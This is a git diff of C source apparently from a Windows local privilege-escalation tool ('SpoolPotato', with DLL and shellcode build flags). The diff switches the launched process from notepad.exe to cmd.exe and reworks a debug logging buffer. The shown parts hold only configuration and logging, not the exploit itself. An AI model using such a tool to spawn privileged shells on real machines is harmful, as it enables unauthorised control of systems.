@@ -21,7 +21,7 @@
 #define DLL_BUILD
 #define SHELLCODE_BUILD
 #define SESSION_ID 1
-#define COMMAND_LINE L"notepad.exe"
+#define COMMAND_LINE L"cmd.exe"
 #define INTERACTIVE_PROCESS FALSE
 #define SYNC_FILE L"C:\\ProgramData\\DoubleStarSync\\DoubleStarSync"
 
@@ -33,19 +33,23 @@
 #ifdef DEBUG
 void DebugLog(const wchar_t* Format, ...) {
     va_list Args;
-    wchar_t* pBuffer = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 10000 * 2);
+    static wchar_t* pBuffer = NULL;
+
+    if (pBuffer == NULL) {
+        pBuffer = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 10000 * 2);
+    }
+
     va_start(Args, Format);
     wvsprintfW(pBuffer, Format, Args);
     va_end(Args);
 #ifdef DLL_BUILD
     uint32_t dwMsgAnswer = 0;
     WTSSendMessageW(WTS_CURRENT_SERVER_HANDLE, SESSION_ID, (wchar_t*)L"", 0, pBuffer, (wcslen(pBuffer) + 1) * 2, 0, 0, &dwMsgAnswer, TRUE);
-    //MessageBoxW(0, pBuffer, L"SpoolPotato", 0);
 #endif
 #ifdef EXE_BUILD
     printf("%ws\r\n", pBuffer);
 #endif
-    HeapFree(GetProcessHeap(), 0, pBuffer);
+    //HeapFree(GetProcessHeap(), 0, pBuffer);
 }
 #endif
 
